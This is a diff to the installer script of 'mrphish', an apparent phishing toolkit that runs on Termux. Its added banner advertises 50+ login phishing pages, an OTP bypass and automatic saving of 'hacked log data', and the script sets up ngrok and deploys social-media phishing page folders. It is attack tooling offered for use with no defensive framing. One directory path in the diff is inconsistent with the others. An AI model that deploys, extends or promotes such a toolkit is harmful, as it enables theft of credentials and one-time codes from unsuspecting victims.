@@ -1,6 +1,28 @@
 #basic packages install
 #only one time install request pkgs
 #make sure you have internet with speed
+clear
+echo -e "\e[96m      |-----------------------[V 1.1]-----------------------|"
+echo -e "\e[96m      |----------------------\e[92mUPDATE V1.1\e[96m--------------------|"
+echo -e "\e[96m      |-----------------------------------------------------|"
+echo -e "\e[96m      |                                                     |"
+echo -e "\e[96m      |            > 50+ latest pages with otp options      |"
+echo -e "\e[96m      |            > 5+ categories most demanding           |"
+echo -e "\e[96m      |            > Ngrok time rmeoved, link works         |"
+echo -e "\e[96m      |            > Optimized pages and interface          |"
+echo -e "\e[96m      |            > Latest otp bypass with java timer      |"
+echo -e "\e[96m      |            > Auto hacked log data save              |"
+echo -e "\e[96m      |            > Sound alert mode                       |"
+echo -e "\e[96m      |            > New interface neon mode                |"
+echo -e "\e[96m      |                                                     |"
+echo -e "\e[96m      |-----------------------------------------------------|"
+echo -e "\e[96m      |-----------------------\e[91mFEATURES\e[96m----------------------|"
+echo -e "\e[96m      |-----------------------------------------------------|"
+sleep 14.0
+clear
+echo -e "\e[96m      |------------[ INSTALLATION STARTED ]-----------------|"
+echo -e "\e[96m      |-------[KEEP YOUR DEVICE AWAY FOR WHILE]-------------|"
+sleep 8.0
 apt-get update -y
 apt-get upgrade -y
 termux-setup-storage
@@ -18,7 +40,7 @@ cd /sdcard
 mkdir dUmpS
 cd $HOME/mrphish
 mv log.mp3 /sdcard
-cd $HOME/mrphish/core
+cd $HOME/mrphish
 chmod +x ngrok
 mv ngrok $HOME
 cd $HOME
@@ -89,7 +111,7 @@ rm -rf socialmedia5
 cd $HOME/mrphish/core/deploys
 cd socialmedia6
 mv * $HOME/mrphish/core/deploys/socialmedia
-cd $HOME/mrphish/core/deploys
+cd $HOME/new/mrphish/core/deploys
 rm -rf socialmedia6
 cd $HOME/mrphish/core/deploys
 cd socialmedia7
@@ -127,5 +149,6 @@ cd $HOME/mrphish/core/deploys
 rm -rf others1
 rm *.zip
 cd $HOME/mrphish
+mpv /sdcard/log.mp3
 rm setup
 bash mrphish
